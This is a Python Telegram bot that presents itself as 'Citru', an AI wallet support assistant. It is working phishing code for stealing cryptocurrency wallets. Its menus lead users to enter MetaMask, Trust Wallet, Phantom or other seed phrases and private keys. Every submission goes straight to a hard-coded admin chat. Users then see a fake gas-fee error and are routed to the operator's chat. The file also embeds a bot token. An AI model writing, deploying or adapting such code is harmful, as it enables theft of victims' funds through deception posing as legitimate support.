import logging
import time
import asyncio
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters,
    CallbackQueryHandler
)

# Set up logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Your credentials
TOKEN = "7353365087:AAGJ3RdIr7ax7abGTAtAOPkKuHYaswoZXqo"
ADMIN_CHAT_ID = 6022914180  # Your admin chat ID

# Conversation states
MAIN_MENU, WALLET_SUBMENU, WALLET_SELECTION, IMPORT_METHOD, GET_WALLET_NAME, GET_DETAILS, CHAT_WITH_ADMIN = range(7)

# Store active chats between users and admin
active_chats = {}
# Store conversation history for each user
conversation_history = {}

# Menu options with emojis
WALLET_SUBMENU_OPTIONS = [
    "➕ Create Wallet",
    "📥 Import Wallet",
    "💰 Check Balance",
    "📊 Portfolio",
    "🕰 Wallet History",
    "🔙 Main Menu"
]

WALLET_OPTIONS = {
    "🦊 MetaMask": ["📝 Seed Phrase", "🔑 Private Key"],
    "🔐 Trust Wallet": ["📝 Seed Phrase", "🔑 Private Key"],
    "👻 Phantom": ["📝 Seed Phrase", "🔑 Private Key"],
    "💼 Other Wallet": ["📝 Enter Wallet Name"],
    "🔙 Back": []
}

# Add this function for auto-restart
def run_bot_with_restart():
    """Run the bot with automatic restart on failure"""
    restart_count = 0
    max_restarts = 10  # Limit restarts to prevent infinite loops

    while restart_count < max_restarts:
        try:
            logger.info(f"Starting bot (attempt {restart_count + 1})...")
            main()
        except Exception as e:
            restart_count += 1
            logger.error(f"Bot crashed with error: {e}")
            logger.info(f"Restarting in 10 seconds... (Restart {restart_count}/{max_restarts})")
            time.sleep(10)

    logger.error("Max restarts reached. Bot stopped permanently.")

def make_keyboard(items, columns=2):
    """Create a keyboard with specified number of columns"""
    keyboard = []
    for i in range(0, len(items), columns):
        row = items[i:i+columns]
        keyboard.append([KeyboardButton(item) for item in row])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

async def log_to_admin(context: ContextTypes.DEFAULT_TYPE, message: str):
    """Helper function to log messages to admin"""
    try:
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=message,
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Failed to log to admin: {e}")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors to prevent bot from crashing"""
    error = context.error
    logger.error(f"Exception while handling an update: {error}")

    # Try to notify user
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "⚠️ An error occurred. Please try again or use /start to restart."
            )
    except:
        pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send the main menu"""
    try:
        context.user_data.clear()
        user = update.message.from_user
        await log_to_admin(context, f"👤 User <b>{user.full_name}</b> (ID: {user.id}) started the bot")

        main_options = [
            "🔄 Migration", "📲 Synchronization",
            "🔋 Redeem Request", "💰 Wallet",
            "🛠️ Staking/Unstaking", "⚙️ Wallet Glitch/Error",
            "🎉 Claim Rewards", "🔦 Rectifying",
            "❌ Cancel"
        ]

        await update.message.reply_text(
            """👋 WELCOME, DEGEN!

You just unlocked Citru — your AI wallet assistant built by Mod/Support to make wallet chaos a thing of the past. ⚙️💸
No fluff. No delays. Just pure, automated wallet mastery.

🔗 Your personalized portal to fast, frictionless support starts now.

⸻

*Here's what I do best:*
⚡ Hunt down stuck or failed transactions
⚡ Spot duplicate charges & request refunds
⚡ Check your wallet balance in real-time
⚡ Secure your account like a vault
⚡ Solve issues before they cost you

I'm live 24/7 — no sleep, no limits. Ask anything, anytime.
And if something's outside my range, I'll escalate it instantly to a human pro. 💼👨‍💻

⸻

Welcome to the future of support.
Let's fix it. Fast. 🚀
""",
            reply_markup=make_keyboard(main_options, columns=2),
            parse_mode="Markdown"
        )

        return MAIN_MENU
    except Exception as e:
        logger.error(f"Error in start: {e}")
        await error_handler(update, context)
        return ConversationHandler.END

async def handle_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle main menu selection"""
    try:
        choice = update.message.text
        user = update.message.from_user
        await log_to_admin(context, f"👤 User <b>{user.full_name}</b> (ID: {user.id}) selected: {choice}")

        if choice == "❌ Cancel":
            await update.message.reply_text(
                "Operation cancelled. Use /start to begin again.",
                reply_markup=ReplyKeyboardRemove()
            )
            context.user_data.clear()
            return ConversationHandler.END

        context.user_data['service'] = choice

        if choice == "💰 Wallet":
            await update.message.reply_text(
                "🔷 *Wallet Services*:",
                reply_markup=make_keyboard(WALLET_SUBMENU_OPTIONS, columns=2),
                parse_mode="Markdown"
            )
            return WALLET_SUBMENU

        wallet_choices = list(WALLET_OPTIONS.keys())[:-1]
        wallet_choices.append("🔙 Main Menu")

        await update.message.reply_text(
            "🔷 *Select Wallet Type*:",
            reply_markup=make_keyboard(wallet_choices, columns=2),
            parse_mode="Markdown"
        )
        return WALLET_SELECTION
    except Exception as e:
        logger.error(f"Error in handle_main_menu: {e}")
        await error_handler(update, context)
        return MAIN_MENU

async def handle_wallet_submenu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle wallet submenu selection"""
    try:
        choice = update.message.text
        user = update.message.from_user
        await log_to_admin(context, f"👤 User <b>{user.full_name}</b> (ID: {user.id}) selected: {choice}")

        if choice == "🔙 Main Menu":
            return await start(update, context)

        if choice == "➕ Create Wallet":
            await update.message.reply_text(
                "⚠️ *Wallet Creation*\n\n"
                "You cannot create a new wallet through this bot.",
                parse_mode="Markdown",
                reply_markup=make_keyboard(WALLET_SUBMENU_OPTIONS, columns=2)
            )
            return WALLET_SUBMENU

        elif choice in ["💰 Check Balance", "📊 Portfolio", "🕰 Wallet History"]:
            context.user_data['service'] = choice
            wallet_choices = list(WALLET_OPTIONS.keys())[:-1]
            wallet_choices.append("🔙 Back")

            await update.message.reply_text(
                f"🔷 To {choice}, please select your wallet type:",
                reply_markup=make_keyboard(wallet_choices, columns=2),
                parse_mode="Markdown"
            )
            return WALLET_SELECTION

        elif choice == "📥 Import Wallet":
            wallet_choices = list(WALLET_OPTIONS.keys())[:-1]
            wallet_choices.append("🔙 Back")

            await update.message.reply_text(
                "🔷 *Select Wallet Type to Import*:",
                reply_markup=make_keyboard(wallet_choices, columns=2),
                parse_mode="Markdown"
            )
            return WALLET_SELECTION

        await update.message.reply_text("⚠️ Please select a valid option")
        return WALLET_SUBMENU
    except Exception as e:
        logger.error(f"Error in handle_wallet_submenu: {e}")
        await error_handler(update, context)
        return WALLET_SUBMENU

async def handle_wallet_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle wallet type selection"""
    try:
        wallet = update.message.text
        user = update.message.from_user
        await log_to_admin(context, f"👤 User <b>{user.full_name}</b> (ID: {user.id}) selected wallet: {wallet}")

        if wallet == "🔙 Back":
            await update.message.reply_text(
                "🔷 *Wallet Services*:",
                reply_markup=make_keyboard(WALLET_SUBMENU_OPTIONS, columns=2),
                parse_mode="Markdown"
            )
            return WALLET_SUBMENU
        elif wallet == "🔙 Main Menu":
            return await start(update, context)

        if wallet not in WALLET_OPTIONS:
            await update.message.reply_text("⚠️ Please select a valid wallet")
            return WALLET_SELECTION

        context.user_data['wallet'] = wallet

        if context.user_data.get('service') in ["💰 Check Balance", "📊 Portfolio", "🕰 Wallet History"]:
            if wallet == "💼 Other Wallet":
                await update.message.reply_text(
                    "🔷 Please enter the name of your wallet:",
                    reply_markup=make_keyboard(["🔙 Back"])
                )
                return GET_WALLET_NAME
            else:
                methods = WALLET_OPTIONS[wallet]
                methods.append("🔙 Back")
                await update.message.reply_text(
                    f"🔷 To {context.user_data['service']}, please provide your wallet credentials:",
                    reply_markup=make_keyboard(methods, columns=2),
                    parse_mode="Markdown"
                )
                return IMPORT_METHOD

        if wallet == "💼 Other Wallet":
            await update.message.reply_text(
                "🔷 Please enter the name of your wallet:",
                reply_markup=make_keyboard(["🔙 Back"])
            )
            return GET_WALLET_NAME

        methods = WALLET_OPTIONS[wallet]
        methods.append("🔙 Back")
        await update.message.reply_text(
            f"🔷 *How to import {wallet}*:",
            reply_markup=make_keyboard(methods, columns=2),
            parse_mode="Markdown"
        )
        return IMPORT_METHOD
    except Exception as e:
        logger.error(f"Error in handle_wallet_selection: {e}")
        await error_handler(update, context)
        return WALLET_SELECTION

async def handle_wallet_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle custom wallet name input"""
    try:
        wallet_name = update.message.text
        user = update.message.from_user
        await log_to_admin(context, f"👤 User <b>{user.full_name}</b> (ID: {user.id}) entered wallet name: {wallet_name}")

        if wallet_name == "🔙 Back":
            wallet_choices = list(WALLET_OPTIONS.keys())[:-1]
            wallet_choices.append("🔙 Back")
            await update.message.reply_text(
                "↩️ Select wallet type:",
                reply_markup=make_keyboard(wallet_choices, columns=2)
            )
            return WALLET_SELECTION

        context.user_data['custom_wallet'] = wallet_name

        methods = ["📝 Seed Phrase", "🔑 Private Key", "🔙 Back"]
        await update.message.reply_text(
            f"🔷 *How to access {wallet_name}*:",
            reply_markup=make_keyboard(methods, columns=2),
            parse_mode="Markdown"
        )
        return IMPORT_METHOD
    except Exception as e:
        logger.error(f"Error in handle_wallet_name: {e}")
        await error_handler(update, context)
        return GET_WALLET_NAME

async def handle_import_method(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle import method selection"""
    try:
        method = update.message.text
        user = update.message.from_user
        await log_to_admin(context, f"👤 User <b>{user.full_name}</b> (ID: {user.id}) selected method: {method}")

        if method == "🔙 Back":
            wallet = context.user_data.get('wallet')
            if wallet == "💼 Other Wallet":
                await update.message.reply_text(
                    "🔷 Please enter the name of your wallet:",
                    reply_markup=make_keyboard(["🔙 Back"])
                )
                return GET_WALLET_NAME
            else:
                wallet_choices = list(WALLET_OPTIONS.keys())[:-1]
                wallet_choices.append("🔙 Back")
                await update.message.reply_text(
                    "↩️ Select wallet type:",
                    reply_markup=make_keyboard(wallet_choices, columns=2),
                    parse_mode="Markdown"
                )
                return WALLET_SELECTION

        if method not in ["📝 Seed Phrase", "🔑 Private Key"]:
            await update.message.reply_text("⚠️ Please select valid method")
            return IMPORT_METHOD

        context.user_data['method'] = method

        prompt = {
            "📝 Seed Phrase": "🔐 Please enter your *12/24-word seed phrase*:",
            "🔑 Private Key": "🔐 Please enter your *private key*:"
        }[method]

        await update.message.reply_text(
            prompt,
            parse_mode="Markdown",
            reply_markup=make_keyboard(["🔙 Back"])
        )
        return GET_DETAILS
    except Exception as e:
        logger.error(f"Error in handle_import_method: {e}")
        await error_handler(update, context)
        return IMPORT_METHOD

async def handle_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle sensitive details input"""
    try:
        details = update.message.text
        user = update.message.from_user

        if details == "🔙 Back":
            wallet = context.user_data.get('wallet')
            if wallet == "💼 Other Wallet":
                wallet_name = context.user_data.get('custom_wallet')
                methods = ["📝 Seed Phrase", "🔑 Private Key", "🔙 Back"]
                await update.message.reply_text(
                    f"🔷 *How to access {wallet_name}*:",
                    reply_markup=make_keyboard(methods, columns=2),
                    parse_mode="Markdown"
                )
            else:
                methods = WALLET_OPTIONS[wallet]
                methods.append("🔙 Back")
                await update.message.reply_text(
                    f"🔷 *How to access {wallet}*:",
                    reply_markup=make_keyboard(methods, columns=2),
                    parse_mode="Markdown"
                )
            return IMPORT_METHOD

        # Store the details
        context.user_data['details'] = details

        # Create a chat session
        user_id = user.id
        active_chats[user_id] = {
            'admin_id': ADMIN_CHAT_ID,
            'user_info': f"{user.full_name} (ID: {user_id})",
            'wallet': context.user_data.get('wallet', 'Unknown'),
            'method': context.user_data.get('method', 'Unknown'),
            'details': details,
            'timestamp': time.time()
        }

        # Initialize conversation history for this user
        if user_id not in conversation_history:
            conversation_history[user_id] = []

        # Add the initial details to conversation history
        conversation_history[user_id].append({
            'sender': 'user',
            'message': details,
            'timestamp': time.time()
        })

        # Send detailed info to admin
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=f"🔔 <b>New support request</b>\n\n"
                 f"👤 <b>User</b>: {user.full_name}\n"
                 f"🆔 <b>ID</b>: {user_id}\n"
                 f"💰 <b>Wallet</b>: {context.user_data.get('wallet', 'Unknown')}\n"
                 f"🔐 <b>Method</b>: {context.user_data.get('method', 'Unknown')}\n\n"
                 f"<b>Details</b>:\n<code>{details}</code>\n\n"
                 f"<i>Use the buttons below to respond</i>",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💬 Reply to user", callback_data=f"reply_{user_id}")],
                [InlineKeyboardButton("❌ Close chat", callback_data=f"close_{user_id}")],
                [InlineKeyboardButton("📋 List all chats", callback_data="list_chats")]
            ])
        )

        method = context.user_data.get('method', '')

        if method == "📝 Seed Phrase":
            word_count = len(details.strip().split())
            if word_count not in [12, 24]:
                await update.message.reply_text(
                    "⚠️ *Invalid Seed Phrase*",
                    parse_mode="Markdown",
                    reply_markup=make_keyboard(["🔙 Back"])
                )
                return GET_DETAILS

        elif method == "🔑 Private Key":
            private_key = details.strip()
            if private_key.startswith("0x"):
                private_key = private_key[2:]
            if not (len(private_key) == 64 and all(c in "0123456789abcdefABCDEF" for c in private_key)):
                await update.message.reply_text(
                    "⚠️ *Invalid Private Key*",
                    parse_mode="Markdown",
                    reply_markup=make_keyboard(["🔙 Back"])
                )
                return GET_DETAILS

        # Show gas fee error to user first
        await update.message.reply_text(
            "⚠️ <b>Error Connecting</b>: Not Enough Gas Fee!",
            parse_mode='HTML'
        )

        # Wait for 3 seconds before showing the admin notification
        await asyncio.sleep(3)

        # Then show the admin notification message
        await update.message.reply_text(
            "An admin has been notified. You can now chat directly with support.\n"
            "Please describe your issue in detail:",
            reply_markup=ReplyKeyboardRemove()
        )

        return CHAT_WITH_ADMIN
    except Exception as e:
        logger.error(f"Error in handle_details: {e}")
        await error_handler(update, context)
        return GET_DETAILS

async def handle_chat_with_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle ongoing chat between user and admin"""
    try:
        user = update.message.from_user
        user_id = user.id

        if user_id not in active_chats:
            await update.message.reply_text("Your session has ended. Please start again with /start")
            return ConversationHandler.END

        # Update timestamp
        active_chats[user_id]['timestamp'] = time.time()

        # Store message in conversation history
        if user_id not in conversation_history:
            conversation_history[user_id] = []

        message_text = update.message.text or update.message.caption or "[Media message]"
        conversation_history[user_id].append({
            'sender': 'user',
            'message': message_text,
            'timestamp': time.time()
        })

        # Forward user message to admin with proper formatting
        try:
            if update.message.photo:
                caption = f"📷 <b>Photo from</b> {active_chats[user_id]['user_info']}"
                if update.message.caption:
                    caption += f"\n\n{update.message.caption}"

                await context.bot.send_photo(
                    chat_id=ADMIN_CHAT_ID,
                    photo=update.message.photo[-1].file_id,
                    caption=caption,
                    parse_mode='HTML',
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("💬 Reply", callback_data=f"reply_{user_id}")],
                        [InlineKeyboardButton("❌ Close", callback_data=f"close_{user_id}")]
                    ])
                )
            elif update.message.document:
                caption = f"📄 <b>Document from</b> {active_chats[user_id]['user_info']}"
                if update.message.caption:
                    caption += f"\n\n{update.message.caption}"

                await context.bot.send_document(
                    chat_id=ADMIN_CHAT_ID,
                    document=update.message.document.file_id,
                    caption=caption,
                    parse_mode='HTML',
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("💬 Reply", callback_data=f"reply_{user_id}")],
                        [InlineKeyboardButton("❌ Close", callback_data=f"close_{user_id}")]
                    ])
                )
            else:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=f"💬 <b>Message from</b> {active_chats[user_id]['user_info']}:\n\n{update.message.text}",
                    parse_mode='HTML',
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("💬 Reply", callback_data=f"reply_{user_id}")],
                        [InlineKeyboardButton("❌ Close", callback_data=f"close_{user_id}")]
                    ])
                )

            # Confirm to user that message was sent
            await update.message.reply_text("✅ Message sent to support!", reply_to_message_id=update.message.message_id)
        except Exception as e:
            logger.error(f"Error forwarding message: {e}")
            await update.message.reply_text("⚠️ Failed to send message. Please try again.")

        return CHAT_WITH_ADMIN
    except Exception as e:
        logger.error(f"Error in handle_chat_with_admin: {e}")
        await error_handler(update, context)
        return CHAT_WITH_ADMIN

async def handle_admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin replies via inline buttons"""
    try:
        query = update.callback_query
        await query.answer()

        data = query.data
        if '_' not in data:
            if data == "list_chats":
                # List all active chats
                if not active_chats:
                    await query.edit_message_text("❌ No active chats available.")
                    return

                keyboard = []
                for uid, chat_data in active_chats.items():
                    keyboard.append([
                        InlineKeyboardButton(
                            f"👤 {chat_data['user_info']} - {chat_data['wallet']}",
                            callback_data=f"reply_{uid}"
                        )
                    ])

                keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_list")])

                await query.edit_message_text(
                    "📋 <b>Active Chats</b>\n\nSelect a user to reply to:",
                    parse_mode='HTML',
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            return

        action, user_id = data.split('_', 1)
        user_id = int(user_id)

        if action == "reply":
            # Store that admin is replying to this user
            context.user_data['replying_to'] = user_id
            user_info = active_chats[user_id]['user_info'] if user_id in active_chats else f"User {user_id}"

            # Build conversation history message
            history_text = "📋 <b>Conversation History</b>\n\n"

            if user_id in conversation_history:
                for msg in conversation_history[user_id]:
                    sender = "👤 User" if msg['sender'] == 'user' else "👨‍💻 Admin"
                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(msg['timestamp']))
                    history_text += f"<b>{sender} ({timestamp})</b>:\n{msg['message']}\n\n"
            else:
                history_text += "No conversation history found.\n\n"

            history_text += "<i>Type your reply or /cancel to stop</i>"

            await query.edit_message_text(
                text=history_text,
                parse_mode='HTML'
            )
        elif action == "close":
            # Close the chat
            if user_id in active_chats:
                del active_chats[user_id]
            if user_id in conversation_history:
                del conversation_history[user_id]
            await query.edit_message_text(text=f"❌ Chat with user {user_id} closed.")

            # Notify user
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text="ℹ️ The support chat has been closed. Use /start if you need more help.",
                    reply_markup=ReplyKeyboardRemove()
                )
            except Exception as e:
                logger.error(f"Error notifying user about closed chat: {e}")
    except Exception as e:
        logger.error(f"Error in handle_admin_reply: {e}")
        try:
            await query.edit_message_text("❌ Error processing request")
        except:
            pass

async def handle_admin_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin messages to users"""
    try:
        if update.message.text and update.message.text.startswith('/'):
            # Let command handlers process commands
            return

        if 'replying_to' not in context.user_data:
            # Show list of active chats if admin isn't replying to anyone
            if not active_chats:
                await update.message.reply_text("❌ No active chats available.")
                return

            keyboard = []
            for uid, chat_data in active_chats.items():
                keyboard.append([
                    InlineKeyboardButton(
                        f"👤 {chat_data['user_info']} - {chat_data['wallet']}",
                        callback_data=f"reply_{uid}"
                    )
                ])

            await update.message.reply_text(
                "📋 <b>Active Chats</b>\n\nSelect a user to reply to or type /list:",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return

        user_id = context.user_data['replying_to']

        if user_id not in active_chats:
            await update.message.reply_text("❌ This chat session no longer exists.")
            del context.user_data['replying_to']
            return

        try:
            # Store admin message in conversation history
            if user_id not in conversation_history:
                conversation_history[user_id] = []

            message_text = update.message.text or update.message.caption or "[Media message]"
            conversation_history[user_id].append({
                'sender': 'admin',
                'message': message_text,
                'timestamp': time.time()
            })

            if update.message.photo:
                caption = f"📷 <b>Support response</b>:\n"
                if update.message.caption:
                    caption += f"\n{update.message.caption}"

                await context.bot.send_photo(
                    chat_id=user_id,
                    photo=update.message.photo[-1].file_id,
                    caption=caption,
                    parse_mode='HTML'
                )
            elif update.message.document:
                caption = f"📄 <b>Support response</b>:\n"
                if update.message.caption:
                    caption += f"\n{update.message.caption}"

                await context.bot.send_document(
                    chat_id=user_id,
                    document=update.message.document.file_id,
                    caption=caption,
                    parse_mode='HTML'
                )
            else:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"👨‍💻 <b>Support response</b>:\n\n{update.message.text}",
                    parse_mode='HTML'
                )

            await update.message.reply_text("✅ Reply sent!", reply_to_message_id=update.message.message_id)
        except Exception as e:
            logger.error(f"Error sending admin reply: {e}")
            await update.message.reply_text("⚠️ Failed to send reply. User may have blocked the bot.")
            del context.user_data['replying_to']
    except Exception as e:
        logger.error(f"Error in handle_admin_message: {e}")

async def admin_list_chats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command to list all active chats"""
    try:
        if not active_chats:
            await update.message.reply_text("❌ No active chats available.")
            return

        keyboard = []
        for uid, chat_data in active_chats.items():
            keyboard.append([
                InlineKeyboardButton(
                    f"👤 {chat_data['user_info']} - {chat_data['wallet']}",
                    callback_data=f"reply_{uid}"
                )
            ])

        await update.message.reply_text(
            "📋 <b>Active Chats</b>\n\nSelect a user to reply to:",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    except Exception as e:
        logger.error(f"Error in admin_list_chats: {e}")
        await update.message.reply_text("❌ Error listing chats.")

async def cancel_admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel admin reply mode"""
    try:
        if 'replying_to' in context.user_data:
            user_id = context.user_data['replying_to']
            await update.message.reply_text(
                f"Stopped replying to user {user_id}.",
                reply_markup=ReplyKeyboardRemove()
            )
            del context.user_data['replying_to']
        else:
            await update.message.reply_text("Not currently replying to any user.")
    except Exception as e:
        logger.error(f"Error in cancel_admin_reply: {e}")

async def cleanup_chats(context: ContextTypes.DEFAULT_TYPE):
    """Periodic cleanup of old chats to prevent memory issues"""
    try:
        current_time = time.time()
        to_remove = []
        for user_id, chat_data in active_chats.items():
            if current_time - chat_data['timestamp'] > 86400:  # 24 hours
                to_remove.append(user_id)

        for user_id in to_remove:
            try:
                # Notify user
                await context.bot.send_message(
                    chat_id=user_id,
                    text="ℹ️ Your support session has timed out. Use /start if you need more help.",
                    reply_markup=ReplyKeyboardRemove()
                )
            except:
                pass
            if user_id in active_chats:
                del active_chats[user_id]
            if user_id in conversation_history:
                del conversation_history[user_id]
            logger.info(f"Cleaned up old chat for user {user_id}")
    except Exception as e:
        logger.error(f"Error in cleanup_chats: {e}")

def main():
    """Start the bot"""
    try:
        application = Application.builder().token(TOKEN).build()

        # Add error handler
        application.add_error_handler(error_handler)

        # Conversation handler for users
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler('start', start)],
            states={
                MAIN_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_main_menu)],
                WALLET_SUBMENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_wallet_submenu)],
                WALLET_SELECTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_wallet_selection)],
                IMPORT_METHOD: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_import_method)],
                GET_WALLET_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_wallet_name)],
                GET_DETAILS: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_details)],
                CHAT_WITH_ADMIN: [
                    MessageHandler(filters.TEXT | filters.PHOTO | filters.Document.ALL, handle_chat_with_admin)
                ]
            },
            fallbacks=[CommandHandler('start', start)],
            allow_reentry=True
        )

        application.add_handler(conv_handler)

        # Admin handlers
        application.add_handler(CallbackQueryHandler(handle_admin_reply))
        application.add_handler(MessageHandler(
            filters.Chat(ADMIN_CHAT_ID) & (filters.TEXT | filters.PHOTO | filters.Document.ALL) & ~filters.COMMAND,
            handle_admin_message
        ))
        application.add_handler(CommandHandler(
            'cancel',
            cancel_admin_reply,
            filters=filters.Chat(ADMIN_CHAT_ID)
        ))
        application.add_handler(CommandHandler(
            'list',
            admin_list_chats,
            filters=filters.Chat(ADMIN_CHAT_ID)
        ))

        # Add periodic cleanup job (runs every hour)
        job_queue = application.job_queue
        if job_queue:
            job_queue.run_repeating(cleanup_chats, interval=3600, first=10)

        print("🔷 Bot is running... Press Ctrl+C to stop")
        application.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True
        )

    except Exception as e:
        logger.error(f"Failed to start bot: {e}")
        import traceback
        traceback.print_exc()
        # Don't exit immediately - let the restart wrapper handle it
        raise  # Re-raise the exception to trigger restart

if __name__ == '__main__':
    # Use the auto-restart wrapper instead of directly calling main()
    run_bot_with_restart()